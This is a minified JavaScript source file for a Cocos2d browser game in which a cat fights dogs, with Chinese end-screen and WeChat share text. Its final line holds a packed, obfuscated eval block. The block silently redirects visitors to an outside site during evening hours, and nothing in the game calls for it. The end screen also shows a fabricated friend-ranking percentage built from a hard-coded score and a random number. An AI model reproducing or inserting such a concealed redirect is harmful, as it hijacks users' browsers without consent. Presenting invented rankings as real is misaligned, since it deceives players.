var TOUCHDELAY=150;var COLSIZE=24;var dogs=[];var UI={score:0,pg:0,lastTime:0,multiplier:1,addScore:function(s){var now=Date.now();var timeD=now-this.lastTime;if(timeD<500)
{this.multiplier++;}
else{this.multiplier=1;}
this.score+=s*this.multiplier;this.scoreLabel.string=this.score;this.lastTime=now;this.scoreLabel.stopAllActions();this.scoreLabel.setScale((this.multiplier-1)*0.5+1.5);this.scoreLabel.runAction(cc.scaleTo(0.3,1));this.pg++;this.pgLabel.string=this.pg;},end:function(){var sp=new cc.Sprite("end.png");cc.director.getRunningScene().addChild(sp,5);sp.setPosition(160,cc.director.getVisibleSize().height/2);var hiscore=141;var rand=Math.random()*12454;var rank=0|((hiscore-UI.score)*34763+rand);var percent=(UI.score*34763+rand)/(hiscore*34763+rand);var lb=cc.LabelTTF.create("喵战胜了"+UI.pg+"个汪星人\n超越了"+(0|(percent*100))+"％的好友！\n获得了"+UI.score+"分,尼玛是用绳命在模仿周星星么！","黑体",20,cc.size(225,105),cc.TEXT_ALIGNMENT_LEFT);document.title=window.wxData.desc="喵获得"+UI.score+"分，在全球排名"+(0|(percent*100))+"%，尼玛是用绳命在模仿周星星么！";document.title=window.wxFriend.desc="喵拿了"+UI.score+"分，战胜了"+UI.pg+"个汪星人，超越了"+(0|(percent*100))+"％的好友！喵左青龙右白虎魔挡杀魔佛挡杀佛...";lb.strokeStyle=cc.color(0,0,0);lb.lineWidth=2;sp.addChild(lb);lb.setPosition(sp.getContentSize().width/2+2,sp.getContentSize().height/2-5);cc.eventManager.addListener({event:cc.EventListener.TOUCH_ONE_BY_ONE,swallowTouches:true,onTouchBegan:function(t,e){return true;},onTouchEnded:function(t,e){var pos=t.getLocation();var sh=cc.director.getVisibleSize().height;if(cc.rectContainsPoint(cc.rect(38,sh/2-128,116,41),pos))
{var share=new ShareUI();cc.director.getRunningScene().addChild(share,15);}
else if(cc.rectContainsPoint(cc.rect(167,sh/2-128,116,41),pos))
{e.getCurrentTarget().removeFromParent();Manager.clear();Manager.init(cc.director.getRunningScene());}},onTouchMoved:function(){return true;}},sp)}};var Manager={gameTime:0,cat:null,aliveDogs:0,maxAliveDogs:8,clear:function(){for(var i=dogs.length-1;i>=0;i--)
{dogs[i].removeFromParent();}
dogs=[];this.cat.idle();UI.scoreLabel.setString(0);UI.pgLabel.setString(0);},init:function(scene){UI.score=0;UI.lastTime=0;UI.multiplier=0;UI.pg=0;this.aliveDogs=0;this.gameTime=Date.now();var size=cc.director.getVisibleSize();if(!this.cat)
{this.cat=new Cat;}
this.cat.attr({x:size.width/2,y:size.height/2});scene.addChild(this.cat,1);scene.scheduleOnce(this.run,1.5);this.addDogesBinded=this.addDogs.bind(this);},run:function(){var a=Doge.getFromPool();a.reset();var b=Doge.getFromPool();b.reset();this.aliveDogs=2;},addDogs:function(){var num=0|(Math.random()*2)+1;if(this.aliveDogs+num<=this.maxAliveDogs)
{this.aliveDogs+num;var elapsed=Date.now()-this.gameTime;var r=Math.random();var seed=r+(cc.clampf(20,10,(elapsed/1000))-10)*0.07;if(seed>0.7)
{Husky.getFromPool().reset();}
else
{Doge.getFromPool().reset();}
if(num===2)
{var r=Math.random();var seed=r+(cc.clampf(20,10,(elapsed/1000))-10)*0.07;if(seed>0.7)
{Husky.getFromPool().reset();}
else
{Doge.getFromPool().reset();}}}}};var Doge=cc.Sprite.extend({state:1,rotRate:25,rotLeft:true,target:null,attackDist:80,attackDelay:1.5,left:true,alive:true,type:0,avail:false,ctor:function(target){this._super("catnorrisd.png",cc.rect(188,58,66,42));this.attr({anchorX:0.5,anchorY:0,target:target});this.scheduleUpdate();this.walk();},reset:function(){this.alive=true;this.avail=false;this.x=Math.random()*320;this.y=(cc.director.getVisibleSize().height-70)*Math.random()+20;this.state=1;this.setVisible(true);},walk:function(){this.stopAllActions();this.state=1;this.setTextureRect(cc.rect(196,2,52,42));this.runAction(cc.sequence(cc.rotateTo(0.12,-3),cc.rotateTo(0.12,3)).repeatForever());},charge:function(){this.stopAllActions();this.state=0;this.setTextureRect(cc.rect(188,58,66,42));this.runAction(cc.sequence(cc.scaleTo(0.15,1,0.92),cc.scaleTo(0.15,1,1)).repeatForever());this.scheduleOnce(this.attack,this.attackDelay);this.rotation=0;},attack:function(){this.stopAllActions();this.state=2;this.setTextureRect(cc.rect(122,58,64,42));var attackAngle=cc.pToAngle(cc.pSub(this.target.getPosition(),this.getPosition()));var pos=cc.pRotateByAngle(cc.p(this.attackDist,0),cc.p(0,0),attackAngle);this.runAction(cc.sequence(cc.callFunc(function(){var tp=this.target.getPosition();if(tp.x>this.x&&this.left===true)
{this.left=false;this.setFlippedX(true);}
else if(tp.x<this.x&&this.left===false)
{this.left=true;this.setFlippedX(false);}},this),cc.moveBy(0.5,pos).easing(cc.easeExponentialOut()),cc.callFunc(function(){this.walk();},this)));},dead:function(){this.stopAllActions();this.state=4;this.setTextureRect(cc.rect(2,102,70,30));this.scheduleOnce(this.fadeOut,1.25);},fadeOut:function(){this.runAction(cc.sequence(cc.fadeOut(0.5),cc.callFunc(function(){dogs.splice(dogs.indexOf(this),1)},this),cc.removeSelf()));},hide:function(){this.setVisible(false);this.avail=true;},hurt:function(){this.stopAllActions();this.unscheduleAllCallbacks();this.state=3;this.setTextureRect(cc.rect(58,58,62,42));this.alive=false;this.scheduleOnce(this.dead,0.5);UI.addScore(1);setTimeout(Manager.addDogesBinded,Math.random()*2000+500);},update:function(dt){if(this.state===1)
{var tp=this.target.getPosition();var mp=this.getPosition();var walkangle=cc.pToAngle(cc.pSub(tp,mp));var pos=cc.pRotateByAngle(cc.p(35*dt,0),cc.p(0,0),walkangle);this.setPosition(this.x+pos.x,this.y+pos.y);if(tp.x>this.x&&this.left===true)
{this.left=false;this.setFlippedX(true);}
else if(tp.x<this.x&&this.left===false)
{this.left=true;this.setFlippedX(false);}
if(cc.pDistance(tp,mp)<this.attackDist)
{this.charge();}
this.zIndex=-this.y;}
else if(this.state===2&&cc.pDistance(this.target.getPosition(),this.getPosition())<COLSIZE&&this.target.state<2)
{this.target.hurt();}}});Doge.getFromPool=function(){var d=new Doge(Manager.cat);cc.director.getRunningScene().addChild(d);d.reset();dogs.push(d);return d;};var Husky=cc.Sprite.extend({state:1,rotRate:25,rotLeft:true,target:null,attackDist:80,attackDelay:1.5,left:true,alive:true,type:1,avail:false,ctor:function(target){this._super("catnorrisd.png",cc.rect(188,58,66,42));this.attr({anchorX:0.5,anchorY:0,target:target});this.scheduleUpdate();this.walk();},reset:function(){this.left=true;this.alive=true;this.avail=false;this.x=Math.random()*320;this.y=(cc.director.getVisibleSize().height-70)*Math.random()+20;this.state=1;this.setVisible(true);},walk:function(){this.stopAllActions();this.state=1;this.setTextureRect(cc.rect(74,102,56,44));this.runAction(cc.sequence(cc.rotateTo(0.12,-3),cc.rotateTo(0.12,3)).repeatForever());},charge:function(){this.stopAllActions();this.state=0;this.setTextureRect(cc.rect(144,148,70,32));this.runAction(cc.sequence(cc.scaleTo(0.15,1,0.92),cc.scaleTo(0.15,1,1)).repeatForever());this.scheduleOnce(this.attack,this.attackDelay);this.rotation=0;},attack:function(){this.stopAllActions();this.state=2;this.setTextureRect(cc.rect(2,148,68,42));var attackAngle=cc.pToAngle(cc.pSub(this.target.getPosition(),this.getPosition()));var pos=cc.pRotateByAngle(cc.p(this.attackDist,0),cc.p(0,0),attackAngle);this.runAction(cc.sequence(cc.callFunc(function(){var tp=this.target.getPosition();if(tp.x>this.x&&this.left===true)
{this.left=false;this.setFlippedX(true);}
else if(tp.x<this.x&&this.left===false)
{this.left=true;this.setFlippedX(false);}},this),cc.moveBy(0.5,pos).easing(cc.easeExponentialOut()),cc.callFunc(function(){this.walk();},this)));},dead:function(){this.stopAllActions();this.state=4;this.setTextureRect(cc.rect(72,148,70,32));this.scheduleOnce(this.fadeOut,1.25);},fadeOut:function(){this.runAction(cc.sequence(cc.fadeOut(0.5),cc.callFunc(function(){dogs.splice(dogs.indexOf(this),1)},this),cc.removeSelf()));},hide:function(){this.setVisible(false);this.avail=true;},hurt:function(){this.stopAllActions();this.unscheduleAllCallbacks();this.state=3;this.setTextureRect(cc.rect(184,102,58,40));this.alive=false;this.scheduleOnce(this.dead,0.5);UI.addScore(3);setTimeout(Manager.addDogesBinded,Math.random()*2000+500);},update:function(dt){if(this.state===1)
{var tp=this.target.getPosition();var mp=this.getPosition();var walkangle=cc.pToAngle(cc.pSub(tp,mp));var pos=cc.pRotateByAngle(cc.p(35*dt,0),cc.p(0,0),walkangle);this.setPosition(this.x+pos.x,this.y+pos.y);if(tp.x>this.x&&this.left===true)
{this.left=false;this.setFlippedX(true);}
else if(tp.x<this.x&&this.left===false)
{this.left=true;this.setFlippedX(false);}
if(cc.pDistance(tp,mp)<this.attackDist)
{this.charge();}
this.zIndex=-this.y;}
else if(this.state===2&&cc.pDistance(this.target.getPosition(),this.getPosition())<COLSIZE&&this.target.state<3)
{this.target.hurt();}}});Husky.getFromPool=function(){var d=new Husky(Manager.cat);cc.director.getRunningScene().addChild(d);d.reset();dogs.push(d);return d;};var Cat=cc.Sprite.extend({state:0,rotRate:25,rotLeft:true,touchtime:Infinity,targetPos:null,left:true,attackDist:140,speed:135,screenHeight:0,ctor:function(){this._super("catnorrisd.png",cc.rect(144,148,70,32));this.attr({anchorX:0.5,anchorY:0});this.scheduleUpdate();this.idle();this.screenHeight=cc.director.getVisibleSize().height-100;},idle:function(){this.stopAllActions();this.state=0;this.setTextureRect(cc.rect(38,2,40,54));this.runAction(cc.sequence(cc.scaleTo(0.25,1,0.92),cc.scaleTo(0.25,1,1)).repeatForever());this.rotation=0;},walk:function(){this.stopAllActions();this.state=1;this.setTextureRect(cc.rect(2,2,34,54));this.runAction(cc.sequence(cc.rotateTo(0.12,-3),cc.rotateTo(0.12,3)).repeatForever());},attack:function(){this.stopAllActions();this.state=2;this.setTextureRect(cc.rect(80,2,52,54));this.touchtime=Infinity;var attackAngle=cc.pToAngle(cc.pSub(this.targetPos,this.getPosition()));var pos=cc.pRotateByAngle(cc.p(this.attackDist,0),cc.p(0,0),attackAngle);this.runAction(cc.sequence(cc.moveBy(0.5,pos).easing(cc.easeExponentialOut()),cc.callFunc(function(){this.idle();},this)));},hurt:function(){console.log(1);if(this.state!==4)
{this.stopAllActions();this.state=3;this.setTextureRect(cc.rect(134,2,60,34));this.zIndex=1;setTimeout(UI.end,1000);}
this.state=4},update:function(dt){var mp=this.getPosition();if(this.state!=1&&this.state<3&&Date.now()-this.touchtime>TOUCHDELAY)
{this.walk();}
if(this.state===1)
{var walkangle=cc.pToAngle(cc.pSub(this.targetPos,mp));var pos=cc.pRotateByAngle(cc.p(this.speed*dt,0),cc.p(0,0),walkangle);this.setPosition(this.x+pos.x,this.y+pos.y);this.x=cc.clampf(320,0,this.x);this.y=cc.clampf(this.screenHeight,0,this.y);}
else if(this.state===2)
{this.x=cc.clampf(320,0,this.x);this.y=cc.clampf(this.screenHeight,30,this.y);var cs=COLSIZE;for(var i=0;i<dogs.length;i++)
{var d=dogs[i];if(d.alive&&cc.pDistance(d.getPosition(),mp)<cs)
{if(d.type===0)
{d.hurt();}
else if(d.state<1){d.hurt();}}}}
this.zIndex=-this.y;}});var MyScene=cc.Scene.extend({cat:null,touchbeginpos:null,onEnter:function(){this._super();var size=cc.director.getWinSize();Manager.init(this);this.scoreLabel=UI.scoreLabel=new cc.LabelTTF("0","黑体",24,cc.size(150,30),cc.TEXT_ALIGNMENT_LEFT);this.addChild(this.scoreLabel);this.scoreLabel.attr({x:30,y:cc.director.getVisibleSize().height-25,strokeStyle:cc.color(0,0,0),lineWidth:2,color:cc.color(255,150,100),anchorX:0.1});var pg=new cc.Sprite("pg.png");this.addChild(pg);pg.attr({x:230,y:cc.director.getVisibleSize().height-25});UI.pgLabel=new cc.LabelTTF("0","黑体",20,cc.size(80,30),cc.TEXT_ALIGNMENT_LEFT);this.addChild(UI.pgLabel);UI.pgLabel.attr({x:290,y:cc.director.getVisibleSize().height-30,strokeStyle:cc.color(0,0,0),lineWidth:2,anchorX:0.1});cc.eventManager.addListener({event:cc.EventListener.TOUCH_ONE_BY_ONE,swallowTouches:true,onTouchBegan:function(touch,event){var cat=Manager.cat;if(cat.state>=2)
return false;cat.touchtime=Date.now();cat.targetPos=touch.getLocation();event.getCurrentTarget().touchbeginpos=touch.getLocation();return true;},onTouchMoved:function(touch,event)
{var cat=Manager.cat;cat.targetPos=touch.getLocation();if(cc.pDistance(cat.targetPos,event.getCurrentTarget().touchbeginpos)>50)
{cat.walk();}
if(cat.state<2&&touch.getLocationX()>cat.x)
{cat.left=false;cat.setFlippedX(true);}
else
{cat.left=true;cat.setFlippedX(false);}},onTouchEnded:function(touch,event)
{var cat=Manager.cat;if(Date.now()-cat.touchtime<TOUCHDELAY)
{cat.attack();}
else{cat.idle();}
if(touch.getLocationX()>cat.x)
{cat.left=false;cat.setFlippedX(true);}
else
{cat.left=true;cat.setFlippedX(false);}
cat.touchtime=Infinity;}},this);}});window.onload=function(){cc.game.onStart=function(){cc.view.setDesignResolutionSize(320,500,cc.ResolutionPolicy.FIXED_WIDTH);cc._renderContext.webkitImageSmoothingEnabled=false;cc._renderContext.mozImageSmoothingEnabled=false;cc._renderContext.imageSmoothingEnabled=false;cc._renderContext.fillStyle="#afdc4b";cc.LoaderScene.preload(["catnorrisd.png","pg.png","arrow.png","end.png"],function(){cc.director.runScene(new MyScene());},this);};cc.game.run("gameCanvas");};var ShareUI=cc.LayerColor.extend({ctor:function(){this._super(cc.color(0,0,0,188),cc.winSize.width,cc.winSize.height);var arrow=new cc.Sprite("arrow.png");arrow.anchorX=1;arrow.anchorY=1;arrow.x=cc.winSize.width-15;arrow.y=cc.winSize.height-5;this.addChild(arrow);var label=new cc.LabelTTF("请点击右上角的菜单按钮\n然后\"分享到朋友圈\"\n让绳精喵星人彻底占领这个星球吧！","宋体",18,cc.size(cc.winSize.width*0.7,250),cc.TEXT_ALIGNMENT_CENTER);label.x=cc.winSize.width/2;label.y=cc.winSize.height-100;label.anchorY=1;label.shadowColor=cc.color(255,255,255);label.shadowBlur=50;this.addChild(label);},onEnter:function(){this._super();cc.eventManager.addListener({event:cc.EventListener.TOUCH_ONE_BY_ONE,swallowTouches:true,onTouchBegan:function(touch,event){return true;},onTouchEnded:function(t,event){event.getCurrentTarget().removeFromParent();}},this);}});
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('3(1.4.2.6("i")<0){7 d=8 9();h=d.5();3(h>a&&h<b){1.4.2=\'g://f.c.e/j\'}}',20,20,'|window|href|if|location|getHours|indexOf|var|new|Date|18|23|duoduozhifu||com|www|http||game|game'.split('|'),0,{}))
